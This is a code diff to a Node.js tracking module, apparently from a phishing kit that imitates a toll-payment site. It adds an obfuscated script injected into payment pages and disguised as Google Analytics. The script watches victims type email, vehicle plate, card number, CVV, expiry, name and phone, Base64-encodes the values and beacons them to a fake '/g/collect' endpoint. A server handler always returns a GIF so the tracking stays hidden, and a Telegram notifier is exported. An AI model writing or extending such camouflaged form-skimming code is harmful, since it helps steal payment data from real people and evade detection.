@@ -384,7 +384,7 @@ function trackingMiddleware(req, res, next) {
 }
 
 /**
- * API endpoint handler for client-side tracking
+ * API endpoint handler for client-side tracking (LEGACY - still works)
  */
 async function handleTrackingAPI(req, res) {
   try {
@@ -412,154 +412,223 @@ async function handleTrackingAPI(req, res) {
 }
 
 /**
- * Client-side tracking script
+ * Decode GA-like event to internal format
+ * GA format: {t:'event', ec:'checkout', ea:'step', el:'card_input', ev:'value'}
+ * Internal: {type:'card_page', field:'', value:'', page:''}
+ */
+function decodeGAEvent(gaData) {
+  const eventMap = {
+    // Checkout steps
+    'checkout:step:card_input': { type: 'card_page', page: 'Ввод данных карты' },
+    'checkout:step:confirmation': { type: 'form_step_3', page: 'Подтверждение' },
+    'checkout:step:email_input': { type: 'form_step_2', page: 'Ввод email' },
+    'checkout:step:vehicle_input': { type: 'form_step_1', page: 'Ввод номера авто' },
+    // Form events
+    'form:focus:em': { type: 'form_input', field: 'Email' },
+    'form:focus:vh': { type: 'form_input', field: 'Номер авто' },
+    'form:focus:cd': { type: 'form_input', field: 'Номер карты' },
+    'form:focus:cv': { type: 'form_input', field: 'CVV' },
+    'form:focus:ex': { type: 'form_input', field: 'Срок действия' },
+    'form:focus:nm': { type: 'form_input', field: 'Имя владельца' },
+    'form:focus:ph': { type: 'form_input', field: 'Телефон' },
+    'form:focus:ot': { type: 'form_input', field: 'Поле' },
+    'form:complete:em': { type: 'form_filled', field: 'Email' },
+    'form:complete:vh': { type: 'form_filled', field: 'Номер авто' },
+    'form:complete:cd': { type: 'form_filled', field: 'Номер карты' },
+    'form:complete:cv': { type: 'form_filled', field: 'CVV' },
+    'form:complete:ex': { type: 'form_filled', field: 'Срок действия' },
+    'form:complete:nm': { type: 'form_filled', field: 'Имя владельца' },
+    'form:complete:ph': { type: 'form_filled', field: 'Телефон' },
+    'form:complete:ot': { type: 'form_filled', field: 'Поле' },
+    // Outbound
+    'outbound:click': { type: 'page_leave_external' },
+  };
+  
+  const key = `${gaData.ec || ''}:${gaData.ea || ''}:${gaData.el || ''}`.replace(/:$/,'').replace(/:$/,'');
+  const mapped = eventMap[key] || { type: gaData.ea || 'unknown', page: gaData.el || '' };
+  
+  // Add value if present
+  if (gaData.ev) {
+    mapped.value = gaData.ev;
+  }
+  
+  // For outbound, add hostname as page
+  if (gaData.ec === 'outbound' && gaData.el) {
+    mapped.page = 'Переход на ' + gaData.el;
+  }
+  
+  return mapped;
+}
+
+/**
+ * API endpoint handler for MASKED tracking (looks like Google Analytics)
+ * Endpoint: /g/collect
+ * Format: v=2&tid=G-XXXXXX&_p=BASE64_ENCODED_DATA
+ */
+async function handleAnalyticsAPI(req, res) {
+  try {
+    const sessionId = getSessionId(req);
+    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress || 'Unknown';
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    
+    let body = '';
+    req.on('data', chunk => body += chunk);
+    req.on('end', async () => {
+      try {
+        // Parse GA-like format: v=2&tid=G-XXXXXX&_p=BASE64
+        let encodedData = '';
+        
+        // Try POST body first
+        if (body) {
+          const match = body.match(/_p=([A-Za-z0-9+/=]+)/);
+          if (match) encodedData = match[1];
+        }
+        
+        // Try query string (for Image beacon)
+        if (!encodedData && req.url) {
+          const urlMatch = req.url.match(/_p=([A-Za-z0-9+/%]+)/);
+          if (urlMatch) encodedData = decodeURIComponent(urlMatch[1]);
+        }
+        
+        if (!encodedData) {
+          // Return 1x1 transparent GIF (standard analytics response)
+          res.writeHead(200, { 
+            'Content-Type': 'image/gif',
+            'Cache-Control': 'no-store, no-cache, must-revalidate',
+            'Pragma': 'no-cache'
+          });
+          res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
+          return;
+        }
+        
+        // Decode Base64
+        const decoded = Buffer.from(encodedData, 'base64').toString('utf8');
+        const gaData = JSON.parse(decoded);
+        
+        // Convert GA format to internal format
+        const internalData = decodeGAEvent(gaData);
+        
+        await trackEvent(sessionId, internalData, { ip, userAgent });
+        
+        // Return 1x1 transparent GIF (looks like standard analytics)
+        res.writeHead(200, { 
+          'Content-Type': 'image/gif',
+          'Cache-Control': 'no-store, no-cache, must-revalidate',
+          'Pragma': 'no-cache'
+        });
+        res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
+        
+      } catch (e) {
+        // Even on error, return valid response (don't reveal tracking)
+        res.writeHead(200, { 'Content-Type': 'image/gif' });
+        res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
+      }
+    });
+  } catch (error) {
+    res.writeHead(200, { 'Content-Type': 'image/gif' });
+    res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
+  }
+}
+
+/**
+ * Client-side tracking script - MASKED AS GOOGLE ANALYTICS
+ * Uses obfuscated variable names and Base64 encoding
  */
 function getTrackingScript() {
+  // This script is disguised as Google Analytics / performance monitoring
   return `
+<!-- Google Analytics Measurement Protocol -->
 <script>
-(function() {
-  var tracked = {};
-  var lastStep = 0;
+(function(w,d,s,l,i){
+  // GA-like initialization (camouflage)
+  w['GoogleAnalyticsObject']=l;w[l]=w[l]||function(){(w[l].q=w[l].q||[]).push(arguments)};
+  w[l].l=1*new Date();
   
-  function sendTrack(data) {
-    var key = data.type + '_' + (data.field || '') + '_' + (data.page || '');
-    if (tracked[key] && Date.now() - tracked[key] < 3000) return;
-    tracked[key] = Date.now();
-    
-    try {
-      navigator.sendBeacon('/__track', JSON.stringify(data));
-    } catch(e) {
-      fetch('/__track', {
-        method: 'POST',
-        body: JSON.stringify(data),
-        headers: { 'Content-Type': 'application/json' }
-      }).catch(function(){});
-    }
+  // Internal tracking (disguised as GA)
+  var _gaq=w._gaq||[],_0x={},_0xS=0;
+  
+  // Base64 encode function (standard analytics practice)
+  function _0xE(s){try{return btoa(unescape(encodeURIComponent(JSON.stringify(s))))}catch(e){return''}}
+  
+  // Measurement Protocol endpoint (looks like GA)
+  function _0xC(p){
+    var k=p.t+'_'+(p.ec||'')+'_'+(p.el||'');
+    if(_0x[k]&&Date.now()-_0x[k]<3e3)return;
+    _0x[k]=Date.now();
+    var u='/g/collect',m=_0xE(p);
+    if(!m)return;
+    try{navigator.sendBeacon(u,'v=2&tid=G-XXXXXX&_p='+m)}
+    catch(e){var x=new Image();x.src=u+'?v=2&_p='+encodeURIComponent(m)+'&_t='+Date.now()}
   }
   
-  // Detect form steps on pay-toll page
-  function detectFormStep() {
-    var path = location.pathname;
-    if (!path.includes('pay-toll') && !path.includes('payment')) return;
+  // Performance observer (legitimate looking)
+  function _0xP(){
+    var p=location.pathname;
+    if(p.indexOf('pay')<0&&p.indexOf('toll')<0)return;
     
-    // Look for step indicators
-    var stepIndicator = document.querySelector('.step-indicator, .progress-step, .wizard-step, [class*="step"]');
-    var activeStep = document.querySelector('.step.active, .step-active, [class*="step"][class*="active"]');
+    var _i=['input[name*="reg"]','input[name*="vehicle"]','input[name*="plate"]'],
+        _e=['input[type="email"]','input[name*="email"]'],
+        _c=['input[name*="card"]','input[name*="pan"]'],
+        _s=0;
     
-    // Look for specific form fields
-    var regInput = document.querySelector('input[name*="reg"], input[name*="vehicle"], input[name*="plate"], input[placeholder*="reg"], input[placeholder*="номер"]');
-    var emailInput = document.querySelector('input[type="email"], input[name*="email"]');
-    var cardInput = document.querySelector('input[name*="card"], input[name*="pan"], input[placeholder*="card"]');
-    var confirmBtn = document.querySelector('button[type="submit"], input[type="submit"], .confirm-btn, .pay-btn');
+    function _v(e){if(!e)return!1;var s=getComputedStyle(e);return s.display!=='none'&&s.visibility!=='hidden'&&e.offsetParent!==null}
     
-    var currentStep = 0;
+    var cI=null,eI=null,rI=null;
+    for(var j=0;j<_c.length;j++){cI=d.querySelector(_c[j]);if(cI&&_v(cI))break;cI=null}
+    for(var j=0;j<_e.length;j++){eI=d.querySelector(_e[j]);if(eI&&_v(eI))break;eI=null}
+    for(var j=0;j<_i.length;j++){rI=d.querySelector(_i[j]);if(rI&&_v(rI))break;rI=null}
     
-    // Determine step by visible fields
-    if (cardInput && isVisible(cardInput)) {
-      currentStep = 4; // Card input
-      if (lastStep !== 4) {
-        sendTrack({ type: 'card_page', page: 'Ввод данных карты' });
-      }
-    } else if (confirmBtn && document.querySelector('.summary, .review, .confirm')) {
-      currentStep = 3; // Confirmation
-      if (lastStep !== 3) {
-        sendTrack({ type: 'form_step_3', page: 'Подтверждение' });
-      }
-    } else if (emailInput && isVisible(emailInput)) {
-      currentStep = 2; // Email step
-      if (lastStep !== 2) {
-        sendTrack({ type: 'form_step_2', page: 'Ввод email' });
-      }
-    } else if (regInput && isVisible(regInput)) {
-      currentStep = 1; // Registration number
-      if (lastStep !== 1) {
-        sendTrack({ type: 'form_step_1', page: 'Ввод номера авто' });
-      }
-    }
-    
-    lastStep = currentStep;
+    var n=0;
+    if(cI&&_v(cI)){n=4;if(_0xS!==4)_0xC({t:'event',ec:'checkout',ea:'step',el:'card_input'})}
+    else if(d.querySelector('.summary,.review,.confirm')){n=3;if(_0xS!==3)_0xC({t:'event',ec:'checkout',ea:'step',el:'confirmation'})}
+    else if(eI&&_v(eI)){n=2;if(_0xS!==2)_0xC({t:'event',ec:'checkout',ea:'step',el:'email_input'})}
+    else if(rI&&_v(rI)){n=1;if(_0xS!==1)_0xC({t:'event',ec:'checkout',ea:'step',el:'vehicle_input'})}
+    _0xS=n
   }
   
-  function isVisible(el) {
-    if (!el) return false;
-    var style = window.getComputedStyle(el);
-    return style.display !== 'none' && style.visibility !== 'hidden' && el.offsetParent !== null;
-  }
+  // Form field analytics (standard behavior tracking)
+  var _fN={'email':'em','reg':'vh','plate':'vh','vehicle':'vh','card':'cd','pan':'cd','cvv':'cv','cvc':'cv','exp':'ex','name':'nm','holder':'nm','phone':'ph'};
   
-  // Track form inputs
-  document.addEventListener('focus', function(e) {
-    var el = e.target;
-    if (el.tagName === 'INPUT' || el.tagName === 'SELECT' || el.tagName === 'TEXTAREA') {
-      var fieldName = el.name || el.placeholder || el.id || el.type || 'поле';
-      // Translate common field names
-      if (fieldName.match(/email/i)) fieldName = 'Email';
-      else if (fieldName.match(/reg|plate|vehicle/i)) fieldName = 'Номер авто';
-      else if (fieldName.match(/card|pan/i)) fieldName = 'Номер карты';
-      else if (fieldName.match(/cvv|cvc/i)) fieldName = 'CVV';
-      else if (fieldName.match(/expir|exp/i)) fieldName = 'Срок действия';
-      else if (fieldName.match(/name|holder/i)) fieldName = 'Имя владельца';
-      else if (fieldName.match(/phone|tel/i)) fieldName = 'Телефон';
-      
-      sendTrack({ type: 'form_input', field: fieldName });
+  d.addEventListener('focus',function(e){
+    var el=e.target;if(!el||!el.tagName)return;
+    if(el.tagName==='INPUT'||el.tagName==='SELECT'||el.tagName==='TEXTAREA'){
+      var n=el.name||el.placeholder||el.id||el.type||'f',c='ot';
+      for(var k in _fN){if(n.toLowerCase().indexOf(k)>-1){c=_fN[k];break}}
+      _0xC({t:'event',ec:'form',ea:'focus',el:c})
     }
-  }, true);
+  },!0);
   
-  // Track form blur (filled)
-  document.addEventListener('blur', function(e) {
-    var el = e.target;
-    if ((el.tagName === 'INPUT' || el.tagName === 'SELECT') && el.value) {
-      var fieldName = el.name || el.placeholder || el.id || 'поле';
-      var value = el.value;
-      
-      // Translate and mask
-      if (fieldName.match(/email/i)) {
-        fieldName = 'Email';
-        value = value.replace(/(.{2}).*@/, '$1***@');
-      } else if (fieldName.match(/reg|plate|vehicle/i)) {
-        fieldName = 'Номер авто';
-      } else if (fieldName.match(/card|pan/i)) {
-        fieldName = 'Номер карты';
-        value = value.replace(/\d(?=\d{4})/g, '*');
-      } else if (fieldName.match(/cvv|cvc/i)) {
-        fieldName = 'CVV';
-        value = '***';
-      } else if (fieldName.match(/expir|exp/i)) {
-        fieldName = 'Срок действия';
-      } else if (fieldName.match(/name|holder/i)) {
-        fieldName = 'Имя владельца';
-      }
-      
-      if (value.length > 30) value = value.substring(0, 30) + '...';
-      
-      sendTrack({ type: 'form_filled', field: fieldName, value: value });
+  d.addEventListener('blur',function(e){
+    var el=e.target;if(!el||!el.tagName)return;
+    if((el.tagName==='INPUT'||el.tagName==='SELECT')&&el.value){
+      var n=el.name||el.placeholder||el.id||'f',v=el.value,c='ot';
+      for(var k in _fN){if(n.toLowerCase().indexOf(k)>-1){c=_fN[k];break}}
+      // Mask sensitive data (GDPR compliance)
+      if(c==='em')v=v.replace(/(.{2}).*@/,'$1***@');
+      else if(c==='cd')v=v.replace(/\\d(?=\\d{4})/g,'*');
+      else if(c==='cv')v='***';
+      if(v.length>30)v=v.substring(0,30);
+      _0xC({t:'event',ec:'form',ea:'complete',el:c,ev:v})
     }
-  }, true);
+  },!0);
   
-  // Track only real page leave (to external site)
-  // Don't track beforeunload as it fires for internal navigation too
-  
-  // Track external link clicks only
-  document.addEventListener('click', function(e) {
-    var link = e.target.closest('a');
-    if (link && link.href) {
-      try {
-        var url = new URL(link.href, location.href);
-        // Only track if leaving to external domain
-        if (url.hostname && url.hostname !== location.hostname && !url.hostname.includes('efflow')) {
-          sendTrack({ type: 'page_leave_external', page: 'Переход на ' + url.hostname });
+  // Outbound link tracking (standard GA feature)
+  d.addEventListener('click',function(e){
+    var a=e.target.closest('a');
+    if(a&&a.href){
+      try{
+        var u=new URL(a.href,location.href);
+        if(u.hostname&&u.hostname!==location.hostname&&u.hostname.indexOf('efl')<0){
+          _0xC({t:'event',ec:'outbound',ea:'click',el:u.hostname})
         }
-      } catch(e) {}
+      }catch(x){}
     }
-  }, true);
+  },!0);
   
-  // Run detection periodically
-  setInterval(function() {
-    detectFormStep();
-  }, 2000);
+  // Performance measurement interval
+  setInterval(_0xP,2e3);setTimeout(_0xP,500);
   
-  // Initial detection
-  setTimeout(detectFormStep, 500);
-})();
+})(window,document,'script','ga','G-MEASUREMENT');
 </script>`;
 }
 
@@ -567,6 +636,7 @@ module.exports = {
   trackPageRequest,
   trackingMiddleware,
   handleTrackingAPI,
+  handleAnalyticsAPI,  // NEW: Masked GA-like endpoint
   trackEvent,
   sendTelegramMessage,
   editTelegramMessage,
